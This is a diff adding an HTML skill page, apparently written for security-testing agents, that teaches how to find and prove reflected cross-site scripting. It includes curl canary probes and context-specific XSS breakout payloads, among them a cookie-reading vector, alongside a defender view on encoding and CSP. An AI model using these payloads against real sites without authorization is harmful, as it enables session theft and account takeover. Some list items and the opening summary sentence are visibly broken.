@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: xss-reflected</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>xss-reflected</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing for reflected cross-site scripting on an</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="api-security-testing.html">api-security-testing</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Reflected cross-site scripting happens when the application takes input from the request and writes it straight back into the response without safe encoding. The victim must be tricked into opening a crafted link, but the impact is real: session theft, actions as the victim, and phishing inside a trusted origin. This skill covers finding and proving reflected XSS on authorized tests, including exact context classification and minimal proof-of-concept payloads. Stored and DOM variants are separate sub-skills.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map inputs that reflect: URL parameters, search fields, error pages,</li>
+<p>headers reflected in debug output.</p>
+<li>Inject a unique canary string (for example <code>xssprobe123</code>) and locate</li>
+<p>every reflection point in the raw response.</p>
+<li>Classify each sink context: HTML body, double-quoted attribute,</li>
+<p>single-quoted attribute, JavaScript string, or JavaScript code.</p>
+<li>Craft the minimal breakout payload for that exact context.</li>
+<li>Prove execution with a harmless marker (console log or DOM change), not</li>
+<p>a noisy alert box on shared environments.</p>
+<li>Test the payload as a full URL the victim would click, checking length</li>
+<p>and encoding survival.</p>
+<li>Record the request, the reflection context, and the working PoC.</li>
+</ol>
+<h2>1. Reflection mapping</h2>
+<p>Find every place your input lands before choosing a payload.</p>
+<pre><code class="language-bash"># Canary probe across a parameter
+curl -s &#x27;https://target.example/search?q=xssprobe123&#x27; -o /tmp/refl.html
+grep -o &#x27;.\{40\}xssprobe123.\{40\}&#x27; /tmp/refl.html
+
+# Check several inputs at once with distinct canaries
+curl -s &#x27;https://target.example/search?q=AAA111&amp;cat=BBB222&amp;sort=CCC333&#x27; \
+  | grep -o &#x27;.\{30\}\(AAA111\|BBB222\|CCC333\).\{30\}&#x27;
+
+# POST reflection and error-page reflection
+curl -s -X POST &#x27;https://target.example/contact&#x27; \
+  -d &#x27;name=xssprobe123&amp;msg=hi&#x27; | grep -o &#x27;.\{40\}xssprobe123.\{40\}&#x27;
+curl -s &#x27;https://target.example/nonexistent-xssprobe123&#x27; \
+  | grep -o &#x27;.\{40\}xssprobe123.\{40\}&#x27;</code></pre>
+<p>Read 40 characters around each canary. The surrounding characters tell you the context: <code>&lt;p&gt;CANARY&lt;/p&gt;</code> is HTML body, <code>value=&quot;CANARY&quot;</code> is an attribute, <code>var q = &#x27;CANARY&#x27;;</code> is a JavaScript string.</p>
+<h2>2. Context breakout payloads</h2>
+<p>Match the payload to the context. One context, one payload, no guessing.</p>
+<pre><code class="language-bash"># HTML body context: &lt;div&gt;CANARY&lt;/div&gt;
+# Payload: &lt;script&gt;console.log(&#x27;xss&#x27;)&lt;/script&gt;
+# URL-encoded for the link:
+python3 -c &quot;import urllib.parse; print(urllib.parse.quote(\&quot;&lt;script&gt;console.log(&#x27;xss&#x27;)&lt;/script&gt;\&quot;))&quot;
+
+# Double-quoted attribute: &lt;input value=&quot;CANARY&quot;&gt;
+# Payload: &quot;&gt;&lt;script&gt;console.log(&#x27;xss&#x27;)&lt;/script&gt;
+# Or event handler without leaving the tag:
+# Payload: &quot; autofocus onfocus=console.log(&#x27;xss&#x27;)
+
+# Single-quoted attribute: &lt;input value=&#x27;CANARY&#x27;&gt;
+# Payload: &#x27;&gt;&lt;script&gt;console.log(&#x27;xss&#x27;)&lt;/script&gt;
+
+# JavaScript string: &lt;script&gt;var q = &#x27;CANARY&#x27;;&lt;/script&gt;
+# Payload: &#x27;;console.log(&#x27;xss&#x27;);//
+# Or: &#x27;-console.log(&#x27;xss&#x27;)-&#x27;
+
+# JavaScript code context (rare): var id = CANARY;
+# Payload: console.log(&#x27;xss&#x27;);//</code></pre>
+<p>Verify each payload in a real browser, not just curl: encoding, browser parsing quirks, and nested contexts only show at render time.</p>
+<h2>3. Safe proof of concept</h2>
+<p>Prove execution without harming anyone who might click the link during the test.</p>
+<pre><code class="language-html">&lt;!-- Minimal PoC page for the report: shows the payload fired --&gt;
+&lt;script&gt;
+// Reflected payload used (HTML body context):
+// &lt;img src=x onerror=&quot;document.title=&#x27;XSS-CONFIRMED&#x27;&quot;&gt;
+&lt;/script&gt;</code></pre>
+<pre><code class="language-bash"># Harmless execution marker: change the page title instead of alert()
+# Payload: &quot;&gt;&lt;img src=x onerror=document.title=&#x27;XSS-CONFIRMED&#x27;&gt;
+# Confirm by loading the URL in a test browser and reading document.title
+
+# Cookie readability check (proves session theft potential, read-only)
+# Payload: &quot;&gt;&lt;img src=x onerror=console.log(document.cookie)&gt;</code></pre>
+<p>Never exfiltrate real session cookies to an external server during a reflected XSS test unless the rules of engagement explicitly allow it. Reading <code>document.cookie</code> in the console is enough proof.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The reflection is HTML-encoded once but decoded by a second sink.</li>
+<p>Trace the full path: stored procedures, JavaScript that writes <code>innerHTML</code>, and framework templates can decode what the server encoded.</p>
+<li>The canary appears in multiple contexts on one page. Exploit the weakest</li>
+<p>context and note the others; one working sink is enough for the finding.</p>
+<li>Input length limits cut the payload. Use short vectors like</li>
+<p><code>&lt;svg onload=console.log(1)&gt;</code> (24 characters) instead of full script tags.</p>
+<li>The application reflects only after a redirect. Follow redirects with</li>
+<p><code>curl -L</code> or test in the browser so you see the final reflection point.</p>
+<li>Quotes are stripped but angle brackets survive. Event-handler payloads</li>
+<p>need quotes for attributes; try backticks or unquoted attributes in older parsers.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Every breakout is neutralized: the sink may be defended by output</li>
+<p>encoding you have not mapped. Re-check the exact bytes around the canary with <code>curl</code> and <code>xxd</code>; assumed encoding is the usual mistake.</p>
+<li>The reflection needs a POST or a specific header: build the PoC as an</li>
+<p>auto-submitting form page instead of a GET link, and note the higher interaction requirement in the report.</p>
+<li>You need a stronger impact demo: with permission, show a session-cookie</li>
+<p>read in the console and explain the theft scenario; do not build a real exfiltration channel without written approval.</p>
+<li>Reflected input lands in a script src or similar dangerous sink: treat</li>
+<p>it as high severity even without a working alert, and document the sink.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see reflected XSS probes as requests carrying script tags, event handlers, and canary strings, often followed by a browser fetch of the same URL from the tester&#x27;s IP. WAFs signature the common vectors, but context breakouts vary too much to block reliably. The durable fix is context-sensitive output encoding (HTML, attribute, and JavaScript encoders used correctly per sink), plus Content Security Policy as a second layer, never the only layer.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1189 (Drive-by Compromise).</li>
+<li>CWE-79 (Improper Neutralization of Input During Web Page Generation,</li>
+<p>Cross-site Scripting).</p>
+<li>OWASP Testing Guide: Testing for Reflected Cross Site Scripting</li>
+<p>(OTG-INPVAL-001).</p>
+<li>PortSwigger Web Security Academy: Reflected XSS labs and cheat sheet.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
